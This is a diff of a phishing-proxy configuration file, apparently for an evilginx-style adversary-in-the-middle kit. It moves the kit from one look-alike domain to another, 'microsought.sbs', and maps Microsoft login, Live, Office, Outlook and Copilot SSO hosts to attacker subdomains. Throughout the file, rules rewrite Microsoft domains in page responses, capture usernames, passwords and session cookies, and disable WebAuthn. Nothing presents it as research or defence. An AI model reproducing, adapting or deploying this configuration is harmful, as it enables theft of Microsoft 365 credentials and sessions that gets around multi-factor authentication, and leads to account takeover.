@@ -13,13 +13,13 @@ global:
 
 
 # ============================================================
-# login.microsoftonline.com → obs-dl.sbs (ROOT DOMAIN)
+# login.microsoftonline.com → microsought.sbs (ROOT DOMAIN)
 # This is the entry point for OAuth2 authentication.
-# MSAL.js discovery calls go to obs-dl.sbs (same domain = through proxy)
+# MSAL.js discovery calls go to microsought.sbs (same domain = through proxy)
 # so the proxy can fix authorization_endpoint automatically.
 # ============================================================
 login.microsoftonline.com:
-  to: "obs-dl.sbs"
+  to: "microsought.sbs"
   capture:
     - name: "username"
       method: "POST"
@@ -31,7 +31,7 @@ login.microsoftonline.com:
     - name: "password"
       method: "POST"
       path: "/common/login"
-      engine: "form"
+      engine: "json"
       find: "passwd"
       from: "request_body"
 
@@ -70,82 +70,82 @@ login.microsoftonline.com:
   rewrite:
     - name: "rewrite_login_domain"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_live"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_ms"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn"
@@ -159,20 +159,20 @@ login.microsoftonline.com:
 # login.live.com - MSA consumer auth (outlook.com accounts)
 # ============================================================
 login.live.com:
-  to: "live.obs-dl.sbs"
+  to: "live.microsought.sbs"
   capture:
     - name: "msa_password"
       method: "POST"
-      path: "/ppsecure/post.srf"
-      engine: "form"
-      find: "passwd"
+      path: "/checkpassword.srf"
+      engine: "json"
+      find: "password"
       from: "request_body"
 
     - name: "msa_username"
       method: "POST"
-      path: "/ppsecure/post.srf"
-      engine: "form"
-      find: "login"
+      path: "/checkpassword.srf"
+      engine: "json"
+      find: "username"
       from: "request_body"
 
     - name: "msa_auth_cookie"
@@ -218,82 +218,82 @@ login.live.com:
   rewrite:
     - name: "rewrite_live_domain"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_live"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_live"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_live"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_live"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_live"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth_in_live"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_live"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_live"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_ms_in_live"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_in_live"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_live"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_live"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_live"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_live"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows_in_live"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_live"
@@ -307,86 +307,86 @@ login.live.com:
 # login.microsoft.com - alternative login domain
 # ============================================================
 login.microsoft.com:
-  to: "loginmicrosoft.obs-dl.sbs"
+  to: "loginmicrosoft.microsought.sbs"
   rewrite:
     - name: "rewrite_loginmicrosoft_domain"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_loginmicrosoft"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_loginmicrosoft"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_loginmicrosoft"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_loginmicrosoft"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_loginmicrosoft"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth_in_loginmicrosoft"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_loginmicrosoft"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_loginmicrosoft"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_ms_in_loginmicrosoft"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_in_loginmicrosoft"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_loginmicrosoft"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_loginmicrosoft"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_loginmicrosoft"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_loginmicrosoft"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows_in_loginmicrosoft"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_loginmicrosoft"
@@ -400,26 +400,26 @@ login.microsoft.com:
 # login.windows.net - Azure AD token endpoint
 # ============================================================
 login.windows.net:
-  to: "login-windows.obs-dl.sbs"
+  to: "login-windows.microsought.sbs"
   rewrite:
     - name: "rewrite_login_windows_domain"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_windows"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_windows"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_windows"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
 
@@ -428,17 +428,40 @@ login.windows.net:
 # CDN domains (pass-through, no capture needed)
 # ============================================================
 aadcdn.msftauth.net:
-  to: "aadcdn.obs-dl.sbs"
+  to: "aadcdn.microsought.sbs"
 
 
 
 logincdn.msftauth.net:
-  to: "logincdn.obs-dl.sbs"
+  to: "logincdn.microsought.sbs"
 
 
 
 aadcdn.msauth.net:
-  to: "msauth.obs-dl.sbs"
+  to: "msauth.microsought.sbs"
+
+
+
+acctcdn.msauth.net:
+  to: "acctcdn-msauth.microsought.sbs"
+
+
+
+acctcdn.msftauth.net:
+  to: "acctcdn-msftauth.microsought.sbs"
+
+
+
+logincdn.msauth.net:
+  to: "logincdn-msauth.microsought.sbs"
+
+
+
+# ============================================================
+# Telemetry/fingerprint domains (pass-through)
+# ============================================================
+fpt.live.com:
+  to: "fpt.microsought.sbs"
 
 
 
@@ -446,51 +469,51 @@ aadcdn.msauth.net:
 # www.office.com - Office portal (redirect target)
 # ============================================================
 www.office.com:
-  to: "office.obs-dl.sbs"
+  to: "office.microsought.sbs"
   rewrite:
     - name: "rewrite_office_domain"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_office"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_office"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_office"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_office"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_office"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_office"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_office"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "redirect_to_real_after_auth"
@@ -504,71 +527,71 @@ www.office.com:
 # m365.cloud.microsoft - M365 portal
 # ============================================================
 m365.cloud.microsoft:
-  to: "m365.obs-dl.sbs"
+  to: "m365.microsought.sbs"
   rewrite:
     - name: "rewrite_m365_domain"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_m365"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_m365"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_m365"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_m365"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_m365"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_m365"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth_in_m365"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_m365"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_m365"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_m365"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_m365"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_m365"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "redirect_to_real_after_auth"
@@ -582,66 +605,66 @@ m365.cloud.microsoft:
 # ms-sso.copilot.microsoft.com - Copilot SSO
 # ============================================================
 ms-sso.copilot.microsoft.com:
-  to: "ms-sso.obs-dl.sbs"
+  to: "ms-sso.microsought.sbs"
   rewrite:
     - name: "rewrite_mssso_ms_domain"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_com_in_mssso"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_mssso"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_mssso"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_mssso"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_mssso"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_mssso"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_mssso"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_mssso"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_mssso"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_mssso"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_mssso"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
 
@@ -650,66 +673,66 @@ ms-sso.copilot.microsoft.com:
 # ms-sso.copilot.com - Copilot SSO (alternative)
 # ============================================================
 ms-sso.copilot.com:
-  to: "ms-sso-c.obs-dl.sbs"
+  to: "ms-sso-c.microsought.sbs"
   rewrite:
     - name: "rewrite_mssso_c_domain"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_ms_in_c"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_mssso_c"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_mssso_c"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_mssso_c"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_mssso_c"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_mssso_c"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_mssso_c"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_mssso_c"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_mssso_c"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_mssso_c"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_mssso_c"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
 
@@ -718,67 +741,67 @@ ms-sso.copilot.com:
 # account.live.com - MSA account management
 # ============================================================
 account.live.com:
-  to: "account-live.obs-dl.sbs"
+  to: "account-live.microsought.sbs"
   rewrite:
     - name: "rewrite_account_live_domain"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_live_in_account"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_account"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_account"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_account"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_ms_in_account"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_in_account"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_account"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_account"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_account"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
 
 
 # ============================================================
-# outlook.office365.com → outlook.obs-dl.sbs (SUBDOMAIN)
+# outlook.office365.com → outlook.microsought.sbs (SUBDOMAIN)
 # Enterprise OWA - captures session cookies after auth
-# Entry URL: https://outlook.obs-dl.sbs/owa/
+# Entry URL: https://outlook.microsought.sbs/owa/
 # ============================================================
 outlook.office365.com:
-  to: "outlook.obs-dl.sbs"
+  to: "outlook.microsought.sbs"
   capture:
     - name: "outlook_client_id"
       method: "GET"
@@ -839,92 +862,92 @@ outlook.office365.com:
   rewrite:
     - name: "rewrite_outlook365_domain"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_outlook"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_outlook"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_outlook"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_aadcdn_in_outlook"
       find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
+      replace: "aadcdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_logincdn_in_outlook"
       find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
+      replace: "logincdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_msauth_in_outlook"
       find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
+      replace: "msauth.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_account_live_in_outlook"
       find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
+      replace: "account-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_outlook"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_outlook"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
+      replace: "outlook-live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_outlook"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_ms_in_outlook"
       find: "ms-sso\\.copilot\\.microsoft\\.com"
-      replace: "ms-sso.obs-dl.sbs"
+      replace: "ms-sso.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_mssso_copilot_in_outlook"
       find: "ms-sso\\.copilot\\.com"
-      replace: "ms-sso-c.obs-dl.sbs"
+      replace: "ms-sso-c.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_windows_in_outlook"
       find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
+      replace: "login-windows.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_res_cdn_in_outlook"
       find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
+      replace: "res-cdn.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_ecs_in_outlook"
       find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
+      replace: "ecs.microsought.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_outlook"
@@ -938,7 +961,7 @@ outlook.office365.com:
 # outlook.office.com - Alternative enterprise OWA domain
 # ============================================================
 outlook.office.com:
-  to: "outlook-office.obs-dl.sbs"
+  to: "outlook-office.microsought.sbs"
   capture:
     - name: "outlook_office_client_id"
       method: "GET"
@@ -991,62 +1014,62 @@ outlook.office.com:
   rewrite:
     - name: "rewrite_outlook_office_domain"
       find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
+      replace: "outlook-office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook365_in_outlook_office"
       find: "outlook\\.office365\\.com"
-      replace: "outlook.obs-dl.sbs"
+      replace: "outlook.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "obs-dl.sbs"
+      replace: "microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook_office"
       find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
+      replace: "live.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_outlook_office"
       find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
+      replace: "loginmicrosoft.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_outlook_office"
       find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
+      replace: "office.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_outlook_office"
       find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
+      replace: "substrate.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_m365_in_outlook_office"
       find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
+      replace: "m365.microsought.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_live_in_outlook_office"
       find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
